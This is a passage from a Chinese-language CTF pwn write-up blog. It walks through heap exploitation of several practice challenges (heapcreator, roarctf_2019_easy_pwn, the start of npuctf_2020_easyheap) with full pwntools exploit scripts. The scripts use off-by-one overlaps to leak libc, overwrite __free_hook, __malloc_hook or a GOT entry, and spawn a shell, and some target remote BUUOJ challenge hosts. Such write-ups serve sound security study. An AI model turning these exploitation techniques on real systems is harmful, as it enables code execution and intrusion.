class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(free_got_addr)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>通过下图发现，伪造好free_got的地址放到description_chunk的位置，是开了pie。因此是行不通的，这里采用了另一种方法来泄露libc基地址。</p><p><img src="../img/image-20221007204752038.png" alt="image-20221007204752038"></p><h4 id="通过mmap映射超大区域，来泄露libc基地址">通过mmap映射超大区域，来泄露libc基地址</h4><p>在这之前，需要先看一下进程的空间布局。下图转自<a href="https://blog.csdn.net/cztqwan/article/details/80248479">(30条消息) 进程的内存空间布局_cztqwan的博客-CSDN博客_进程内存布局</a></p><p><img src="../img/image-20221007204803175.png" alt="image-20221007204803175"></p><p>每个蓝色空间代表的区域，是否彼此存在随机的偏移，用了random offset来标注。可以看到<strong>内核空间，栈，内存映射段等等都存在着随机偏移，因此我们获取了栈地址也无法利用偏移来算出堆的地址</strong>，其余也是同理。但是<strong>内存映射段都是mmap映射的区域，包括了动态链接库（这里我是这么理解的，如果不对的话，还请指正），因此我们再用mmap映射一块区域，依旧是和动态链接库同属于一大块区域。因此新映射的这块区域和libc基地址存在固定偏移</strong>。怎么触发mmap映射一块区域呢？利用malloc申请一块超大内存来实现，同时这个地址也会被记录在结构体堆块中。</p><p>因此我们将结构体堆块中的description_chunk_addr改成<strong>指向mmap申请的那个地址</strong>即可(这个地址肯定是位于堆上的，因此我们现在需要获取一个堆的地址)</p><p>考虑到author name和结构体堆块的地址紧挨着，因此我们可以将author name给填满，然后打印author name，就得到了一个堆地址，脚本如下：</p><p><img src="../img/LE5DOxmh7TVAZRU-1665146431267-54.png" alt="image-20220603202640806"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,fake_struct)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">leak_heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_heap_addr&#x27;</span>,<span class="built_in">hex</span>(leak_heap_addr))</span><br></pre></td></tr></table></figure><p>接下来先申请一块超大内存，然后利用偏移将结构体堆块(这个结构体堆块是可控的那个堆块）中的description_addr改成指向结构体堆块（这个结构体堆块是存放mmap映射地址的那个堆块）中存放description_addr的地址。</p><p><img src="../img/image-20221007204827458.png" alt="image-20221007204827458"></p><p>然后去泄露这个libc地址，脚本如下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(leak_heap_addr+<span class="number">0x70</span>)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_libc_addr&#x27;</span>,<span class="built_in">hex</span>(leak_libc_addr))</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x5ca010</span></span><br><span class="line">log(<span class="string">&#x27;libc_base_addr&#x27;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br></pre></td></tr></table></figure><p>拿到了libc基地址，我们就去劫持__free_hook，放入one_gadget地址，劫持方法跟泄露libc地址一样，我们将结构体堆块（这个结构体堆块是存放mmap映射地址的那个堆块）中的description改成__free_hook的地址，然后编辑该结构体，写入one_gadget地址。最后再释放掉随便一个堆块，即可获取shell。劫持__free_hook部分的脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base_addr+<span class="number">0x4527a</span></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct=p64(free_hook)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP">EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x128B</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;tttt&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;cccc&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">leak_heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_heap_addr&#x27;</span>,<span class="built_in">hex</span>(leak_heap_addr))</span><br><span class="line"></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(leak_heap_addr+<span class="number">0x70</span>)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_libc_addr&#x27;</span>,<span class="built_in">hex</span>(leak_libc_addr))</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x5ca010</span></span><br><span class="line">log(<span class="string">&#x27;libc_base_addr&#x27;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base_addr+<span class="number">0x4527a</span></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct=p64(free_hook)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitcontraining-heapcreator">hitcontraining_heapcreator</h2><h3 id="整体思路：">整体思路：</h3><p>利用off_by_one把原本的结构体堆块释放再申请变成了申请的堆块，而原本的申请堆块释放再申请成了结构体堆块，从而控制结构体堆块中的堆块信息。关键点就是要把第二个堆块申请成0x10字节的（因为要保证申请结构体堆块的时候，把这个堆块释放掉再申请回来）</p><h3 id="保护策略：-v3">保护策略：</h3><p><img src="../img/image-20221007204845732.png" alt="image-20221007204845732"></p><h3 id="程序分析：">程序分析：</h3><p>各个函数实现的什么功能，我就不说了，应该都能看出来。分析几个有用的点。</p><p>首先这道题是有一个结构体（malloc申请了它的大小为0x10)，它用来记录申请的每个chunk的size和地址。（从下面两个图片可以分析出来）</p><p><img src="../img/ZC1bBRYu9pnxK5q-1665146431268-57.png" alt="image-20220602080236010"></p><p><img src="../img/WhklgpXZ3A1yY9L-1665146431268-58.png" alt="image-20220602080259732"></p><p>而实例化的每个结构体的地址存放到了bss段上。而之后去寻找指定的chunk进行删，改，打印操作都是先去bss段上去找存放的对应结构体，然后根据偏移来寻找其中的记录信息的size和地址成员。</p><h3 id="漏洞点">漏洞点</h3><p><img src="../img/image-20221007204901719.png" alt="image-20221007204901719"></p><p>这里可以输入比申请的size多一个字节的数据，存在刻意的off_by_one漏洞。</p><h3 id="利用思路：-v3">利用思路：</h3><p>我们先申请两个chunk，看一下布局是怎样的。</p><p><img src="../img/image-20221007204910840.png" alt="image-20221007204910840"></p><p>可以发现我们每添加一个chunk，都会在它上面（低地址）有一个，结构体堆块来记录信息。可是现在我们可以用edit往里面多写一个数据，正好可以溢出到下一个结构体堆块的size位，这意味着可以控制下一个结构体堆块的大小。</p><p><img src="../img/image-20221007204918905.png" alt="image-20221007204918905"></p><p>现在我们利用溢出把这个chunk的大小改成0x41（如上图），这就意味着程序现在把原本的结构体堆块和我们申请的chunk当成了一个结构体chunk。现在我们执行delete(1)将其删除，我们就会得到两个处于释放掉的chunk（把申请的chunk（大小为0x20)和结构体堆块（此时是0x41了）都释放掉了）如下图</p><p><img src="../img/image-20221007204926366.png" alt="image-20221007204926366"></p><p>接下来就是核心利用点，我们再申请0x30的大小，这样fastbin里0x40的chunk就会被申请回原来的位置。与此同时程序会自己申请一个0x10的chunk，也就将fastbin里的0x20也申请回去了。<strong>但0x40的这个chunk包含了0x20的这个chunk，而0x40是用户堆块，我们可以往里面写入数据，从而修改里面的0x20的结构体堆块。</strong>(如下图)</p><p><img src="../img/image-20221007204934515.png" alt="image-20221007204934515"></p><p><u>原本结构体堆块是来描述chunk1的信息的（换句话就是，谁是chunk1是由结构体堆块说了算），结果现在结构体堆块到了chunk1的里面，因此现在我们就可以通过控制结构体堆块来伪造chunk1。</u></p><p>我们将chunk1的地址改成（也就是在改结构体堆块的地址成员）atoi的got表，再执行show函数的时候，本来是打印chunk1地址里的内容的，可是现在chunk1的地址改成了atoi的got表，因此实现了泄露atoi的真实地址。同理，执行edit函数的时候，本来是要修改chunk1地址里的内容，结果现在chunk1的地址改成了atoi的got表，因此就相当于修改atoi的真实地址了，改为system，传入/bin/sh即可获取shell。<strong>（要注意的就是写入atoi的got表时，顺便要伪造一个size，因为edit的时候还需要用到这个size，如果填充成0的话，是写不进去数据的）</strong></p><h3 id="EXP：-v2">EXP：</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x400A43</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29606)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content of heap:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content of heap : &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;efgh&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x20</span>)+p64(atoi_got_addr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr_bin_sh_addr=long_search(&#x27;atoi&#x27;,atoi_addr)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="roarctf-2019-easy-pwn">roarctf_2019_easy_pwn</h2><h3 id="保护策略">保护策略;</h3><p><img src="../img/image-20221007205054593.png" alt="image-20221007205054593"></p><h3 id="漏洞分析：-v3">漏洞分析：</h3><p><img src="../img/image-20221007205111216.png" alt="image-20221007205111216"></p><p>猛一看感觉是常规堆溢出，没有对edit函数中的输入数据的大小做检查。不过仔细点开sub_E26这个函数发现，是进行了检查，如果edit函数中的size大于了add函数时堆块的大小，那么就选择add函数时堆块的大小，如果edit函数中的size小于了add函数时创建的堆块大小，那么就选择edit函数的size。</p><p>不过还有一种情况产生了off by one的漏洞，也就是edit函数中的size正好比add函数创建堆块大小大了10,，此时就会产生off by one漏洞（如下）</p><p><img src="../img/image-20221007205123375.png" alt="image-20221007205123375"></p><h3 id="利用思路：-v4">利用思路：</h3><p>然后就是常规的off by one手法，上面已经讲过了。大致就是off by one造成合并之后，spy_chunk位于了一片free的内存中，然后进行申请一定大小的size，正好将spy_chunk的用户区域上存放unsortedbin 中的fd指针，然后将其打印出来，获取libc基地址。</p><p>然后将spy chunk释放掉，再申请回来，打fastbin attack，将__malloc_hook申请出来，打one_gadget。</p><p>然而发现所有的one_gadget都不能使用，那选择用realloc函数来调整栈帧，再打one_gadget。使用realloc函数调整栈帧可以看<a href="https://www.cnblogs.com/ZIKH26/articles/16421631.html">这篇文章</a></p><h3 id="EXP：-v3">EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28799</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#merged chunk</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#merge chunk</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent merge chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="number">0x60</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x100</span>)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">write(<span class="number">1</span>,<span class="number">114</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">malloc_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#realloc_addr=libc_base_addr+libc.symbols[&#x27;realloc&#x27;]</span></span><br><span class="line">realloc_addr=libc_base_addr+<span class="number">0x846c0</span></span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4526a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">payload=<span class="number">0xb</span>*<span class="string">b&#x27;a&#x27;</span>+p64(one_gadget)+p64(realloc_addr+<span class="number">16</span>)<span class="comment">#p64(one_gadget)</span></span><br><span class="line">write(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0xccc)</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007205137521.png" alt="image-20221007205137521"></p><blockquote><p>这道题考察的off by one，但是跟以往用off by one来让堆块合并制造堆块重叠的方式不同。这道题由于限制了申请堆块的大小，让chunk释放之后无法进入unsorted bin (这就意味着堆块无法触发合并)。所以采用伪造size，然后直接释放将其造成堆块重叠。</p></blockquote><h2 id="npuctf-2020-easyheap">npuctf_2020_easyheap</h2><h3 id="保护策略：-v4">保护策略：</h3><p><img src="../img/image-20221007205201197.png" alt="image-20221007205201197"></p><h3 id="漏洞分析">漏洞分析</h3><p><img src="../img/image-20221007205223694.png" alt="image-20221007205223694"></p><p>在edit函数中，<u>输入的数据比申请的chunk范围大了一个字节。然后创建堆块的时候发现只能创建0x18或者0x38的堆块，这正好是off by one利用的前提</u>（如下图）。</p><p><img src="../img/image-20221007205233601.png" alt="image-20221007205233601"></p><h3 id="利用思路">利用思路</h3><p>由于申请的堆块都属于tcachebin的范围，释放掉之后也无法进行合并。所以我们不往制造堆块合并那个方向考虑。<strong>这道题的特殊性是存在指针堆块（就是程序自己申请了一个堆块，里面存放了我们申请堆块的指针）</strong>，像这种题目我们通常采用篡改指针堆块里存放的指针，而且通常是用互换指针堆块和用户堆块的方法。</p><p>以这道题为例，我们申请两个堆块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x18,&#x27;aaaa&#x27;)</span><br><span 